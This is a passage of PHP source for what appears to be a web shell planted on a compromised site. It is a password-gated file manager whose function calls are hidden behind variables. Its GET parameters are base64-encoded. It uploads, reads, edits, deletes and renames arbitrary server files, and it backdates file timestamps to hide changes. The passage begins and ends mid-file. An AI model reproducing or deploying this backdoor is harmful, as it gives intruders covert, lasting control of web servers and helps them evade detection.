if(isset($_GET['o'])){session_destroy();header('Location: '.$_SERVER['PHP_SELF']);exit;}

function root(){
  $r=isset($_SERVER['DOCUMENT_ROOT'])&&is_dir($_SERVER['DOCUMENT_ROOT'])?$_SERVER['DOCUMENT_ROOT']:dirname(__FILE__);
  return rtrim(str_replace('\\','/',$r),'/');
}

// decode base64 GET params seperti referensi
foreach($_GET as $k=>$v)$_GET[$k]=$bd($v);

$dir=isset($_GET['d'])&&$_GET['d']?$_GET['d']:root();
$dir=rtrim(str_replace('\\','/',$ril($dir)?:root()),'/');
$chd($dir);

$msg='';
$view='';

if(!isset($_SESSION['a'])){
  echo'<form method=post style="display:flex;align-items:center;justify-content:center;height:100vh;background:#111"><input type=password name=p placeholder=password style="padding:8px;background:#222;border:1px solid #333;color:#ddd;border-radius:3px;font-family:monospace;font-size:13px"><button style="margin-left:6px;padding:8px 14px;background:#1a5a35;border:none;color:#4fe;border-radius:3px;cursor:pointer;font-family:monospace">ok</button></form>';
  exit;
}

// ── POST actions ──────────────────────────────────────────────────────────────
if($_SERVER['REQUEST_METHOD']==='POST'){

  // upload
  if(isset($_FILES['fu'])){
    $tg=$dir.'/'.$bs($_FILES['fu']['name']);
    $msg=$mup($_FILES['fu']['tmp_name'],$tg)?'uploaded: '.$bs($_FILES['fu']['name']):'upload failed';
  }

  // create file
  elseif(isset($_POST['mk_f'])&&$_POST['mk_f']!==''){
    $fp=$dir.'/'.$bs($_POST['mk_f']);
    $msg=file_exists($fp)?'already exists':($fpc($fp,'')!==false?'created: '.$_POST['mk_f']:'create failed');
  }

  // create folder
  elseif(isset($_POST['mk_d'])&&$_POST['mk_d']!==''){
    $fp=$dir.'/'.$bs($_POST['mk_d']);
    $msg=file_exists($fp)?'already exists':(mkdir($fp)?'folder created':'mkdir failed');
  }

  // save file
  elseif(isset($_POST['sv_f'])&&isset($_POST['sv_c'])){
    $fp=$dir.'/'.$_POST['sv_f'];
    $msg=$fpc($fp,$_POST['sv_c'])!==false?'saved: '.$_POST['sv_f']:'save failed';
  }

  // view/edit file
  elseif(isset($_POST['vw_f'])){
    $fp=$dir.'/'.$_POST['vw_f'];
    $c=$fgc($fp);
    $view=$c!==false?$c:false;
    $view_name=$_POST['vw_f'];
  }

  // delete
  elseif(isset($_POST['rm_f'])){
    $fp=$dir.'/'.$_POST['rm_f'];
    if($isd($fp))$msg=rmdir($fp)?'deleted folder':'delete failed (empty folder only)';
    else $msg=$unl($fp)?'deleted: '.$_POST['rm_f']:'delete failed';
  }

  // rename
  elseif(isset($_POST['rn_o'])&&isset($_POST['rn_n'])&&$_POST['rn_n']!==''){
    $old=$dir.'/'.$_POST['rn_o'];
    $new=$dir.'/'.$bs($_POST['rn_n']);
    $msg=$rnm($old,$new)?'renamed':'rename failed';
  }

  // touch
  elseif(isset($_POST['td_f'])&&isset($_POST['td_t'])){
    $fp=$dir.'/'.$_POST['td_f'];
    $t=strtotime($_POST['td_t']);
    $msg=$tch($fp,$t,$t)?'date changed':'touch failed';
  }
}

// ── breadcrumb ────────────────────────────────────────────────────────────────
$parts=explode('/',$dir);
$crumb='';$cp='';
foreach($parts as $i=>$p){
  if($p==='')continue;
  $cp.='/'.$p;
  $crumb.='/<a href="?d='.$be($cp).'">'.$htm($p).'</a>';
}

// ── scan dir ──────────────────────────────────────────────────────────────────
$entries=$scd($dir);
$files=[];
if($entries){
  foreach($entries as $n){
    if($n==='.')continue;
    $fp=$dir.'/'.$n;
    $files[]=['n'=>$n,'d'=>$isd($fp),'s'=>$isd($fp)?'-':filesize($fp),'m'=>filemtime($fp),'w'=>$isw($fp),'fp'=>$fp];
  }
  usort($files,function($a,$b){if($a['d']!==$b['d'])return $a['d']?-1:1;return strcmp($a['n'],$b['n']);});
}

$qs='d='.$be($dir);
